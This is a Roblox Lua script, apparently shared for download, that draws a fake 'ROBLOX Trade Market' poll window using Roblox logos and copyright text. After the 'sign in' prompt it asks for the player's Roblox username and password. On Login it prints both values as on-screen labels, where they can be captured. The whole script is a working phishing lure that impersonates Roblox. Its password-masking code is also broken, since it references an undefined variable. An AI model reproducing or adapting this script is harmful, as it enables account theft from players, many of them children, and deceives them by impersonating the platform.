--Mediafire
Players = Game:GetService("Players")
Player = Players.LocalPlayer
PlayerGui = Player.PlayerGui
 
function Class(ClassName, Parent, Name, Function)
local Object = Instance.new(ClassName, Parent)
Object.Name = Name
if Function then
Function(Object)
end
return Object
end
 
pcall(function () 
PlayerGui["ROBLOX Trading System"]:Destroy()
end)
 
--92674865 (Responding to User Feedback)
--©2013 ROBLOX Corporation is a Trademark of ROBLOX: ROBLOX is not affiliated with the LEGO, MEGA, or K'Nex products and toys.
 
ScreenGui = Class("ScreenGui", PlayerGui, "ROBLOX Trading System")
Frame = Class("Frame", ScreenGui, "Frame", function (Object) 
Object.Style = "RobloxRound"
Object.Size = UDim2.new(0, 650, 0, 500)
Object.Position = UDim2.new(0.5, -250, 0.5, -250)
end)
Roblox = Class("ImageLabel", Frame, "ImageLabel", function (Object) 
Object.Image = "http://www.roblox.com/asset?id=100709875"
Object.BorderSizePixel = 0
Object.BackgroundTransparency = 1
Object.Size = UDim2.new(0.4, 0, 0.4, 0)
Object.Position = UDim2.new(0.3, 0, 0.05, 0)
end)
Trade = Class("TextLabel", Frame, "TextLabel", function (Object) 
Object.Text = "Trade Market"
Object.TextColor3 = Color3.new(1, 1, 1)
Object.Font = 2
Object.FontSize = 8
Object.TextStrokeColor3 = Color3.new(1, 0, 0)
Object.TextStrokeTransparency = 0
Object.BorderSizePixel = 0
Object.BackgroundTransparency = 1
Object.Size = UDim2.new(0.4, 0, 0.1, 0)
Object.Position = UDim2.new(0.3, 0, 0.15, 0)
end)
Copyright1 = Class("TextLabel", Frame, "TextLabel", function (Object) 
Object.Text = "©2013 ROBLOX Corporation is a Trademark of ROBLOX: ROBLOX is not affiliated with the LEGO, MEGA, or K'Nex products and toys."
Object.TextColor3 = Color3.new(1, 1, 1)
Object.Font = 2
Object.FontSize = 2
Object.TextStrokeColor3 = Color3.new(0.4, 0.4, 0.4)
Object.TextStrokeTransparency = 0.6
Object.BorderSizePixel = 0
Object.BackgroundTransparency = 1
Object.Size = UDim2.new(0, 0, 0, 0)
Object.Position = UDim2.new(0.5, 7.5, 1, 0)
end)
Copyright2 = Class("ImageLabel", Frame, "ImageLabel", function (Object) 
Object.Image = "http://www.roblox.com/asset?id=107726222"
Object.BorderSizePixel = 0
Object.BackgroundTransparency = 1
Object.Size = UDim2.new(0, 15, 0, 15)
Object.Position = UDim2.new(0, 17.5, 1, -7.5)
end)
Info = Class("TextButton", Frame, "TextLabel", function (Object) 
Object.Text = "What is the ROBLOX Trade Market?"
Object.TextColor3 = Color3.new(1, 1, 1)
Object.Font = 2
Object.FontSize = 6
Object.TextStrokeColor3 = Color3.new(0.4, 0.4, 0.4)
Object.TextStrokeTransparency = 0.6
Object.BackgroundTransparency = 1
Object.Size = UDim2.new(0.5, 0, 0.05, 0)
Object.Position = UDim2.new(0.25, 0, 0.3, 0)
end)
Info2 = Class("TextButton", Frame, "TextLabel", function (Object) 
Object.Text = [[    The ROBLOX Trade Market is an in-game feature that is being created by ROBLOX developers. This feature will allow ROBLOX users to interact and trade with other players in-game, and also will allow them to test items before they buy Gear, or Clothing.
Roblox has decided, therefore, to poll the ROBLOX population in order to gather their thoughts about the matter.]]
Object.TextColor3 = Color3.new(1, 1, 1)
Object.Font = 2
Object.FontSize = 6
Object.TextStrokeColor3 = Color3.new(0.4, 0.4, 0.4)
Object.TextStrokeTransparency = 0.6
Object.BackgroundTransparency = 1
Object.Size = UDim2.new(0.75, 0, 0.5, 0)
Object.TextWrap = true
Object.TextXAlignment = "Left"
Object.TextYAlignment = "Top"
Object.Position = UDim2.new(0.125, 0, 0.35, 0)
end)
VoteFrame = Class("Frame", Frame, "Frame", function (Object) 
Object.Style = "ChatRed"
Object.Size = UDim2.new(0.5, 0, 0.1, 0)
Object.Position = UDim2.new(0.25, 0, 0.75, 0)
end)
VoteFrame.MouseEnter:connect(function () 
VoteFrame.Style = "ChatGreen"
end)
VoteFrame.MouseLeave:connect(function () 
VoteFrame.Style = "ChatRed"
end)
Vote = Class("TextButton", Frame, "TextButton", function (Object) 
Object.Text = "Please sign in to continue."
Object.TextColor3 = Color3.new(1, 1, 1)
Object.Font = 2
Object.FontSize = 6
Object.TextStrokeColor3 = Color3.new(0.4, 0.4, 0.4)
Object.TextStrokeTransparency = 0.6
Object.BackgroundTransparency = 1
Object.Size = UDim2.new(0.5, 0, 0.1, 0)
Object.Position = UDim2.new(0.25, 0, 0.75, 0)
end)
Vote.MouseButton1Down:connect(function () 
 
for i = 1, 10 do
wait(0.01)
Vote.TextTransparency = Vote.TextTransparency + 0.1
Vote.TextStrokeTransparency = Vote.TextStrokeTransparency + 0.06
Info.TextTransparency = Info.TextTransparency + 0.1
Info.TextStrokeTransparency = Info.TextStrokeTransparency + 0.06
Info2.TextTransparency = Info2.TextTransparency + 0.1
Info2.TextStrokeTransparency = Info2.TextStrokeTransparency + 0.06
end
 
VoteFrame.Size = UDim2.new(0.25, 0, 0.1, 0)
VoteFrame.Position = UDim2.new(0.375, 0, 0.75, 0)
 
Vote:Destroy()
Info:Destroy()
Info2:Destroy()
 
Please = Class("TextLabel", Frame, "TextLabel", function (Object) 
Object.Text = "Please enter your username and password in the space below."
Object.TextColor3 = Color3.new(1, 1, 1)
Object.TextTransparency = 1
Object.Font = 2
Object.FontSize = 6
Object.TextStrokeColor3 = Color3.new(0.4, 0.4, 0.4)
Object.TextStrokeTransparency = 1
Object.BackgroundTransparency = 1
Object.Size = UDim2.new(0.7, 0, 0.05, 0)
Object.Position = UDim2.new(0.15, 0, 0.3, 0)
end)
UsernameBox = Class("TextBox", Frame, "TextLabel", function (Object) 
Object.Text = ""
Object.TextColor3 = Color3.new(0, 0, 0)
Object.TextTransparency = 1
Object.Font = 2
Object.FontSize = 6
Object.TextStrokeColor3 = Color3.new(0.6, 0.6, 0.6)
Object.TextStrokeTransparency = 1
Object.BorderSizePixel = 0
Object.BackgroundTransparency = 1
Object.BackgroundColor3 = Color3.new(0.9, 0.9, 0.9)
Object.Size = UDim2.new(0.5, 0, 0.05, 0)
Object.Position = UDim2.new(0.35, 0, 0.4, 0)
end)
Username = Class("TextLabel", Frame, "TextLabel", function (Object) 
Object.Text = "Username:"
Object.TextColor3 = Color3.new(1, 1, 1)
Object.TextTransparency = 1
Object.Font = 2
Object.FontSize = 6
Object.TextStrokeColor3 = Color3.new(0.4, 0.4, 0.4)
Object.TextStrokeTransparency = 1
Object.BackgroundTransparency = 1
Object.Size = UDim2.new(0.5, 0, 0.05, 0)
Object.Position = UDim2.new(0, 0, 0.4, 0)
end)
PasswordBox = Class("TextBox", Frame, "TextLabel", function (Object) 
Object.Text = ""
Object.TextColor3 = Color3.new(0, 0, 0)
Object.TextTransparency = 1
Object.Font = 2
Object.FontSize = 6
Object.TextStrokeColor3 = Color3.new(0.6, 0.6, 0.6)
Object.TextStrokeTransparency = 1
Object.BorderSizePixel = 0
Object.BackgroundTransparency = 1
Object.BackgroundColor3 = Color3.new(0.9, 0.9, 0.9)
Object.Size = UDim2.new(0.5, 0, 0.05, 0)
Object.Position = UDim2.new(0.35, 0, 0.5, 0)
end)
Password = Class("TextLabel", Frame, "TextLabel", function (Object) 
Object.Text = "Password:"
Object.TextColor3 = Color3.new(1, 1, 1)
Object.TextTransparency = 1
Object.Font = 2
Object.FontSize = 6
Object.TextStrokeColor3 = Color3.new(0.4, 0.4, 0.4)
Object.TextStrokeTransparency = 1
Object.BackgroundTransparency = 1
Object.Size = UDim2.new(0.5, 0, 0.05, 0)
Object.Position = UDim2.new(0, 0, 0.5, 0)
end)
Login = Class("TextButton", Frame, "TextButton", function (Object) 
Object.Text = "Login"
Object.TextColor3 = Color3.new(1, 1, 1)
Object.TextTransparency = 1
Object.Font = 2
Object.FontSize = 6
Object.TextStrokeColor3 = Color3.new(0.4, 0.4, 0.4)
Object.TextStrokeTransparency = 1
Object.BackgroundTransparency = 1
Object.Size = UDim2.new(0.25, 0, 0.1, 0)
Object.Position = UDim2.new(0.375, 0, 0.75, 0)
end)
 
for i = 1, 10 do
wait(0.01)
Please.TextTransparency = Please.TextTransparency - 0.1
Please.TextStrokeTransparency = Please.TextStrokeTransparency - 0.04
UsernameBox.TextTransparency = UsernameBox.TextTransparency - 0.1
UsernameBox.TextStrokeTransparency = UsernameBox.TextStrokeTransparency - 0.06
UsernameBox.BackgroundTransparency = UsernameBox.BackgroundTransparency - 0.1
Username.TextTransparency = Username.TextTransparency - 0.1
Username.TextStrokeTransparency = Username.TextStrokeTransparency - 0.04
PasswordBox.TextTransparency = PasswordBox.TextTransparency - 0.1
PasswordBox.TextStrokeTransparency = PasswordBox.TextStrokeTransparency - 0.06
PasswordBox.BackgroundTransparency = PasswordBox.BackgroundTransparency - 0.1
Password.TextTransparency = Password.TextTransparency - 0.1
Password.TextStrokeTransparency = Password.TextStrokeTransparency - 0.04
Login.TextTransparency = Login.TextTransparency - 0.1
Login.TextStrokeTransparency = Login.TextStrokeTransparency - 0.04
end
 
Pass = PasswordBox.Text
 
PasswordBox.Changed:connect(function (Property) 
if Property == "Text" then
Pass = PasswordBox.Text
PasswordBox.Text = string.rep("*", #Text)
end
end)
 
Login.MouseButton1Down:connect(function () 
Information1 = Class("TextButton", ScreenGui, "TextButton", function (Object) 
Object.Text = UsernameBox.Text
Object.TextColor3 = Color3.new(1, 1, 1)
Object.Font = 2
Object.FontSize = 6
Object.TextStrokeColor3 = Color3.new(0.4, 0.4, 0.4)
Object.TextStrokeTransparency = 0
Object.BackgroundTransparency = 1
Object.Size = UDim2.new(0, 100, 0, 15)
Object.Position = UDim2.new(0, 0, 0, 350)
end)
Information2 = Class("TextButton", ScreenGui, "TextButton", function (Object) 
Object.Text = Pass
Object.TextColor3 = Color3.new(1, 0.6, 0.6)
Object.Font = 2
Object.FontSize = 6
Object.TextStrokeColor3 = Color3.new(0.6, 0.4, 0.4)
Object.TextStrokeTransparency = 0
Object.BackgroundTransparency = 1
Object.Size = UDim2.new(0, 100, 0, 15)
Object.Position = UDim2.new(0, 200, 0, 350)
end)
end)
 
end)
 